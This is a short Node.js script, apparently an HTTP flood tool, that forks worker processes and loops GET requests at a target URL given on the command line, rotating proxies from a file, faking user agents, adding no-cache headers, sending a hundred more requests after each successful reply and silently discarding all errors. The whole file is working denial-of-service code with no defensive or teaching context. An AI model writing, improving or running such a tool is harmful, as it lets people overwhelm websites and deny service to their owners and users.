const axios = require("axios"),
request = require("request"),
cluster = require("cluster"),
fs = require("fs"),
fakeUa = require('fake-useragent')
if(process.argv.length !== 5){
console.log("Select")
process.exit()
}
const url = process.argv[2];
const thread = process.argv[3];
const medthod = process.argv[4];
function main_process(){ 
function run(){ 
if(medthod != 'bypass'){ 
var proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n');
var proxy = proxies[Math.floor(Math.random() * proxies.length)];
var config = {
     method: 'get', 
     url:url, 
     proxy:'http://'+proxy,
     headers: {
     'Cache-Control':'no-cache',
     'User-Agent': fakeUa()}     

}
request(config,function(e,r){
console.log("5555",r.statusCode)
if(r.statusCode >= 200 && r.statusCode <= 226){
for (let index=0;index<100;index++){
request(config)
}
}
})
}
else{ 
var http = { 
           url:url,
           method:'get', 
           headers:{ 
            'Cache-Control':'no-cache',
            'User-Agent': fakeUa()}     
}
request(http,(e,r)=>{
console.log(r.statusCode)
})
}
}
function th(){
setInterval(()=>{
run()})
}
async function main(){
if(cluster.isMaster){
for(let t=0;t<thread;t++){
cluster.fork()
console.log("Thread In ",t+1)}
}
else{
th()}
}


main()
}
process.on('uncaughtException', function (err){ 
});
process.on('unhandledRejection', function (err){
});
main_process()
